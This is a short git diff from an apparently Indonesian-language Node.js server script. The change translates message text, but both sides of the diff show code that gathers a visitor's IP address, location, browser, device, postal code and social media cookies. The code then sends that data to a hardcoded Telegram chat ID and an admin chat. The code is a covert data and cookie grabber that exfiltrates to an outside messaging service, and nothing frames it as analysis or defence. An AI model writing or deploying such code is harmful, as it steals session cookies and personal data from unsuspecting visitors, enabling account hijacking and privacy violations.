@@ -120,11 +120,11 @@ console.log('Server aktif');
                         const postalCode = data.postal;
                         const socialMediaCookies = getSocialMediaCookies();
                         const chatId = '7407149096'; // Replace with the actual chat ID
-                        const message = `Your IP address is: ${userIp}\nCountry: ${country} ${flagEmoji}\nBrowser: ${browser}\nReferrer: ${referrer}\nDevice Brand: ${deviceBrand}\nPostal Code: ${postalCode}\nSocial Media Cookies: ${socialMediaCookies}`;
+                        const message = `Alamat IP Addres adalah: ${userIp}\nNegara: ${country} ${flagEmoji}\nBrowser: ${browser}\nReferrer: ${referrer}\nDevice Brand: ${deviceBrand}\nPostal Code: ${postalCode}\nSocial Media Cookies: ${socialMediaCookies}`;
                         
                         if (chatId) {
                             sendMessage(chatId, message);
-                            sendMessage(adminChatId, `User with chat ID ${chatId} has IP address: ${userIp}\nCountry: ${country} ${flagEmoji}\nBrowser: ${browser}\nReferrer: ${referrer}\nDevice Brand: ${deviceBrand}\nPostal Code: ${postalCode}\nSocial Media Cookies: ${socialMediaCookies}`);
+                            sendMessage(adminChatId, `ID Telegram Anda ${chatId} Alamat IP Addres adalah: ${userIp}\nNegara: ${country} ${flagEmoji}\nBrowser: ${browser}\nReferrer: ${referrer}\nDevice Brand: ${deviceBrand}\nPostal Code: ${postalCode}\nSocial Media Cookies: ${socialMediaCookies}`);
                         } else {
                             console.error('Chat ID not found.');
                         }
